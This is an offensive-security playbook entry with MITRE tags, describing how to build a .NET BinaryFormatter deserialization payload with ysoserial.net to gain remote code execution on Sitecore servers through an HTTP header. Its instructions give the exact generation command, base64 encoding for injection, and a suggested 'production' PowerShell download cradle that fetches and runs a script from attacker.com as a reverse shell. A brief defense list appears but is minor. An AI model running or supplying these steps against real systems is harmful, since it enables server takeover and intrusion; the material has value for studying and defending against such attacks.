---
id: p2b2c3d4-e5f6-7890-abcd-ef1234567892
name: Generate-Malicious-Serialized-Payload-Using-ysoserial.net
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:54.123Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[PowerShell]]'
sub_techniques: []
tags:
  - rce
  - deserialization
  - .net
platforms:
  - Windows
tools:
  - '[[tools/ysoserial.net]]'
commands:
  - '[[commands/ysoserial-generate-rce-payload]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[PowerShell]]'
---

# Generate-Malicious-Serialized-Payload-Using-ysoserial.net

## Summary

This procedure uses ysoserial.net to create a malicious serialized .NET object compatible with BinaryFormatter, exploiting gadget chains to achieve remote code execution when deserialized by the Sitecore application.

## Description

ysoserial.net is a tool for generating serialized payloads targeting .NET deserialization vulnerabilities. In this scenario, it crafts a TypeConfuseDelegate or similar gadget chain that, upon deserialization in Sitecore's ThumbnailsAccessToken handler, executes arbitrary commands on the server. The attack targets Windows/.NET environments hosting Sitecore, requiring the tool to be run locally. Prerequisites include .NET Framework installation for ysoserial. Outcomes include a payload file that can be injected to trigger RCE, such as spawning processes or reverse shells.

## Requirements

1. ysoserial.net executable (download from GitHub)
2. .NET Framework 4.0+ on the attacker's machine
3. Target command to execute (e.g., calc.exe for testing)

## Defense

Defensive measures and detection strategies:

- Disable or replace BinaryFormatter in applications
- Use object type whitelisting during deserialization
- Scan for ysoserial-generated payloads via antivirus or EDR

## Objectives

1. Generate a valid BinaryFormatter RCE payload
2. Ensure compatibility with Sitecore's deserializer
3. Prepare payload for header injection

## Instructions

### Step 1: Download and Prepare ysoserial.net

**Context**: Obtain the tool and navigate to its directory.

Download from https://github.com/pwntester/ysoserial.net and extract.

### Step 2: Generate the Payload

**Context**: Run ysoserial to create the serialized object with a command payload.

Execute [[commands/ysoserial-generate-rce-payload]]:

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" --out payload.bin
```

> This generates a binary file that deserializes to execute calc.exe. For production, replace with a reverse shell command like "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')".

### Step 3: Encode for Transmission

**Context**: Convert to base64 for HTTP header use.

```bash
echo "$(base64 -w 0 payload.bin)" > payload.b64
```

> Expected output: Base64 string ready for injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[PowerShell]]

### Sub-Techniques


## Commands Used

- [[commands/ysoserial-generate-rce-payload]]

## Tools Used

- [[tools/ysoserial.net]]

## Tags

- [[rce]]
- [[deserialization]]
- [[.net]]
